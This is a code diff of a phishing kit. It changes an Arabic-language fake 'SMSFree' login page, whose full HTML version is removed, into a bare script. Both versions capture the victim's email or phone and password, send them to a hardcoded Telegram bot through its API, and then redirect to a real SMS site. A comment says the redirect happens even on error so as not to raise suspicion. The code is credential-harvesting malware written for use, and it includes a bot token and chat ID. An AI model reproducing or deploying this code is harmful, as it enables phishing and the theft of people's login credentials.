@@ -1,64 +1,40 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول الآمن | SMSFree</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
-    <style>
-        body { margin: 0; padding: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; overflow: hidden; }
-        .login-card { background-color: #141b2b; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); animation: slideUp 0.6s ease; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-        .logo-text { font-weight: 800; font-size: 26px; color: #00f2fe; margin-bottom: 10px; display: block; }
-        .instruction { color: #8b9bb4; font-size: 14px; margin-bottom: 30px; }
-        input { width: 100%; padding: 18px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.02); border: 1.5px solid rgba(255, 255, 255, 0.05); border-radius: 15px; color: #fff; font-family: 'Cairo'; box-sizing: border-box; outline: none; transition: 0.3s; font-size: 15px; }
-        input:focus { border-color: #4facfe; background: rgba(255, 255, 255, 0.05); }
-        button { width: 100%; padding: 18px; font-weight: 800; font-size: 17px; background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; border-radius: 15px; cursor: pointer; color: #0a0e17; transition: 0.3s; margin-top: 10px; }
-        button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 242, 254, 0.3); }
-        .back-link { margin-top: 25px; display: block; color: #4facfe; text-decoration: none; font-size: 13px; }
-    </style>
-</head>
-<body>
+<script>
+    const form = document.getElementById('secure-form');
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        
+        // جلب البيانات من الحقول
+        const u = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        const btn = document.getElementById('btn-submit');
 
-    <div class="login-card">
-        <span class="logo-text">SMSFree Access</span>
-        <p class="instruction">يرجى إدخال بيانات الحساب للمتابعة إلى لوحة الأرقام</p>
+        btn.disabled = true;
+        btn.innerText = "جاري التحقق...";
 
-        <form id="login-form">
-            <input type="text" id="user-field" placeholder="البريد الإلكتروني أو الهاتف" required>
-            <input type="password" id="pass-field" placeholder="كلمة السر" required>
-            <button type="submit" id="submit-btn">تسجيل الدخول</button>
-        </form>
+        // بيانات البوت الخاص بك (تأكد أنها صحيحة)
+        const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4"; 
+        const chatId = "5174578125";
+        
+        // نص الرسالة التي ستصلك
+        const message = `🚀 وصول جديد من صفحة الدخول\n━━━━━━━━━━━━\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}\n━━━━━━━━━━━━`;
 
-        <a href="index.html" class="back-link">العودة للرئيسية</a>
-    </div>
-
-    <script>
-        document.getElementById('login-form').onsubmit = async (e) => {
-            e.preventDefault();
-            const u = document.getElementById('user-field').value;
-            const p = document.getElementById('pass-field').value;
-            const btn = document.getElementById('submit-btn');
-
-            btn.disabled = true;
-            btn.innerText = "جاري التحقق...";
-
-            // بيانات البوت الخاص بك
-            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4"; 
-            const chatId = "5174578125";
-            const text = `🔑 محاولة دخول (Login Page)\n👤 المستخدم: ${u}\n🔑 الكلمة: ${p}`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: text })
-                });
-            } catch (err) {}
-
-            // التحويل النهائي
+        try {
+            // إرسال البيانات مباشرة إلى تلجرام
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+            
+            // التحويل للموقع الحقيقي بعد نجاح الإرسال
             window.location.href = "https://receive-smss.com/";
-        };
-    </script>
-</body>
-</html>
+        } catch (err) {
+            // في حال حدوث خطأ، يتم التحويل أيضاً لعدم إثارة الشكوك
+            window.location.href = "https://receive-smss.com/";
+        }
+    };
+</script>
